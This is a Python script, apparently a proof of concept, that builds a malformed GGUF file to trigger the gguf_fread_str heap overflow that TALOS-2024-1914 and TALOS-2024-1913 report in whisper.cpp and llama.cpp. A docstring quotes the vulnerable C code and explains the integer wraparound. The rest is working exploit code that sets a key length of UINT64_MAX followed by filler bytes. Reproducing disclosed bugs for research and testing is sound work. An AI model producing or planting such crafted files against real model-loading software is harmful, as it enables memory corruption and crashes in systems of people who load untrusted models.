#!/usr/bin/env python3
"""Craft a minimal GGUF file that triggers the gguf_fread_str heap overflow
described in TALOS-2024-1914 (whisper.cpp) / TALOS-2024-1913 (llama.cpp).

The vulnerable code at ggml.c (pre-cpp refactor) is:

    static bool gguf_fread_str(FILE * file, struct gguf_str * p, size_t * offset) {
        p->n    = 0;
        p->data = NULL;
        bool ok = true;
        ok = ok && gguf_fread_el(file, &p->n,    sizeof(p->n), offset);
        p->data = calloc(p->n + 1, 1);
        ok = ok && gguf_fread_el(file,  p->data, p->n,         offset);
        return ok;
    }

If `p->n` is `UINT64_MAX`, then `p->n + 1` wraps to 0, `calloc(0, 1)` returns
a zero-size or tiny pointer, and the subsequent `fread(p->data, p->n=UINT64_MAX,
... )` writes well past the end of that buffer (ASAN heap-buffer-overflow
write).

In practice, fread caps at the file size, but writing even 100+ bytes into a
calloc(0, 1) allocation is enough for ASAN to flag.

We trigger via the first KV entry's key string, since that is the first
gguf_fread_str call after the header.
"""

import struct
import sys

UINT64_MAX = (1 << 64) - 1


def craft_gguf_fread_str_overflow(filename: str) -> None:
    with open(filename, "wb") as f:
        f.write(b"GGUF")                        # magic
        f.write(struct.pack("<I", 3))           # version
        f.write(struct.pack("<Q", 0))           # n_tensors = 0
        f.write(struct.pack("<Q", 1))           # n_kv = 1

        # First KV entry — gguf_fread_str reads the key first.
        # Set declared key length to UINT64_MAX so (n + 1) wraps to 0
        # in `calloc(p->n + 1, 1)`.
        f.write(struct.pack("<Q", UINT64_MAX))   # key.n = UINT64_MAX
        # Append a few bytes of "key data" — fread(p->data, n=UINT64_MAX,
        # ...) will return short, but ASAN catches the over-read attempt
        # against the zero-size calloc result.
        f.write(b"A" * 256)


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "fread_str_overflow.gguf"
    craft_gguf_fread_str_overflow(out)
    print(f"wrote {out}")
